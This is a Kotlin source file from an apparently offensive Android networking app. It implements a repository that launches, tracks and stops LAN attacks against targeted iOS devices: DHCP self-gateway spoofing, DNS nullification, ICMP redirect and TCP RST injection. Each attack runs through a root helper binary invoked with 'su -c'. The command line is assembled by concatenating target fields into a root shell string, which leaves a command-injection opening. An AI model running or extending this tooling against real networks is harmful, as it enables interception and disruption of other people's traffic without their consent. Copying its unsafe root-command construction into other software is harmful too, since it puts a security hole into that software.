package com.vishal.harpy.features.ios_attack.data

import android.content.Context
import com.vishal.harpy.core.native.NativeNetworkWrapper
import com.vishal.harpy.core.utils.LogUtils
import com.vishal.harpy.core.utils.NetworkError
import com.vishal.harpy.core.utils.NetworkResult
import com.vishal.harpy.core.utils.ProcessUtils
import com.vishal.harpy.features.ios_attack.domain.IosAttackConfig
import com.vishal.harpy.features.ios_attack.domain.IosAttackRepository
import com.vishal.harpy.features.ios_attack.domain.IosAttackType
import com.vishal.harpy.features.network_monitor.domain.usecases.IsDeviceRootedUseCase
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.concurrent.ConcurrentHashMap
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class IosAttackRepositoryImpl @Inject constructor(
    private val context: Context,
    private val isDeviceRootedUseCase: IsDeviceRootedUseCase
) : IosAttackRepository {

    private val activeProcesses = ConcurrentHashMap<IosAttackType, Process>()
    private val activeAttacks = ConcurrentHashMap<IosAttackType, Boolean>()

    companion object {
        private const val TAG = "IosAttackRepository"
    }

    override suspend fun startDhcpSelfGateway(config: IosAttackConfig): NetworkResult<Boolean> =
        startIosCommand("ios_dhcp_void", config, IosAttackType.DHCP_SELF_GATEWAY)

    override suspend fun startDnsNullification(config: IosAttackConfig): NetworkResult<Boolean> =
        startIosCommand("ios_dhcp_nullify_dns", config, IosAttackType.DNS_NULLIFY)

    override suspend fun startIcmpRedirect(config: IosAttackConfig): NetworkResult<Boolean> =
        startIosCommand("icmp_redirect", config, IosAttackType.ICMP_REDIRECT)

    override suspend fun startTcpRst(config: IosAttackConfig): NetworkResult<Boolean> =
        startIosCommand("tcp_rst", config, IosAttackType.TCP_RST)

    private suspend fun startIosCommand(
        commandName: String,
        config: IosAttackConfig,
        attackType: IosAttackType
    ): NetworkResult<Boolean> = withContext(Dispatchers.IO) {
        try {
            LogUtils.d(TAG, "Starting iOS attack: $commandName -> ${config.targetMac}")

            // Check if already active
            if (activeAttacks[attackType] == true) {
                LogUtils.w(TAG, "Attack $attackType already active")
                return@withContext NetworkResult.success(true)
            }

            val helperPath = NativeNetworkWrapper.getRootHelperPath(context) ?: run {
                LogUtils.e(TAG, "Root helper not found")
                return@withContext NetworkResult.error(NetworkError.NativeLibraryError(Exception("Root helper not found")))
            }

            // Check root access
            val isRootedResult = isDeviceRootedUseCase()
            if (isRootedResult is NetworkResult.Success && !isRootedResult.data) {
                LogUtils.e(TAG, "Root access not available for iOS attack")
                return@withContext NetworkResult.error(NetworkError.DeviceNotRootedError())
            }

            // Build the command arguments based on attack type
            val args = buildCommandArgs(commandName, config)

            val fullCommand = "su -c $helperPath $args"
            LogUtils.d(TAG, "Executing: $fullCommand")

            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "$helperPath $args"))
            activeProcesses[attackType] = process
            activeAttacks[attackType] = true

            // Read output in background
            kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
                val reader = java.io.BufferedReader(java.io.InputStreamReader(process.inputStream))
                try {
                    while (ProcessUtils.isAlive(process)) {
                        val line = reader.readLine() ?: break
                        LogUtils.d(TAG, "[$commandName] $line")
                    }
                } catch (e: java.io.InterruptedIOException) {
                    // Expected when stopped
                } catch (e: Exception) {
                    LogUtils.e(TAG, "Error reading output: ${e.message}")
                } finally {
                    try { reader.close() } catch (_: Exception) {}
                }
            }

            // Read error stream
            kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
                val errorReader = java.io.BufferedReader(java.io.InputStreamReader(process.errorStream))
                try {
                    while (ProcessUtils.isAlive(process)) {
                        val line = errorReader.readLine() ?: break
                        LogUtils.e(TAG, "[$commandName ERROR] $line")
                    }
                } catch (e: Exception) {
                    LogUtils.e(TAG, "Error reading error stream: ${e.message}")
                } finally {
                    try { errorReader.close() } catch (_: Exception) {}
                }
            }

            // Wait briefly to verify startup
            kotlinx.coroutines.delay(1000)

            if (ProcessUtils.isAlive(process)) {
                LogUtils.i(TAG, "✓ iOS attack started: $attackType")
                NetworkResult.success(true)
            } else {
                LogUtils.e(TAG, "iOS attack process exited early: $attackType")
                activeAttacks[attackType] = false
                activeProcesses.remove(attackType)
                NetworkResult.error(NetworkError.CommandExecutionError(Exception("Attack process exited early")))
            }
        } catch (e: Exception) {
            LogUtils.e(TAG, "Error starting iOS attack: ${e.message}", e)
            activeAttacks[attackType] = false
            activeProcesses.remove(attackType)
            NetworkResult.error(NetworkError.CommandExecutionError(e))
        }
    }

    private fun buildCommandArgs(commandName: String, config: IosAttackConfig): String {
        return when (config.attackType) {
            IosAttackType.DHCP_SELF_GATEWAY,
            IosAttackType.DNS_NULLIFY -> {
                "$commandName ${config.interfaceName} ${config.targetMac} ${config.routerIp} ${config.routerMac} ${config.targetIp}"
            }
            IosAttackType.ICMP_REDIRECT -> {
                val scope = if (config.redirectAll) "all" else config.specificDestination
                "$commandName ${config.interfaceName} ${config.targetMac} ${config.targetIp} ${config.routerIp} ${config.routerMac} $scope"
            }
            IosAttackType.TCP_RST -> {
                "$commandName ${config.interfaceName} ${config.targetMac} ${config.targetIp}"
            }
        }
    }

    override suspend fun stopAttack(attackType: IosAttackType): NetworkResult<Boolean> = withContext(Dispatchers.IO) {
        try {
            LogUtils.d(TAG, "Stopping iOS attack: $attackType")
            val process = activeProcesses[attackType]
            if (process != null && ProcessUtils.isAlive(process)) {
                ProcessUtils.destroyForcibly(process)
            }
            activeProcesses.remove(attackType)
            activeAttacks[attackType] = false
            LogUtils.i(TAG, "✓ iOS attack stopped: $attackType")
            NetworkResult.success(true)
        } catch (e: Exception) {
            LogUtils.e(TAG, "Error stopping attack: ${e.message}")
            activeAttacks[attackType] = false
            NetworkResult.error(NetworkError.CommandExecutionError(e))
        }
    }

    override fun isAttackActive(attackType: IosAttackType): Boolean {
        return activeAttacks[attackType] == true
    }

    override fun getActiveSessions(): List<IosAttackType> {
        return activeAttacks.filter { it.value }.keys.toList()
    }
}
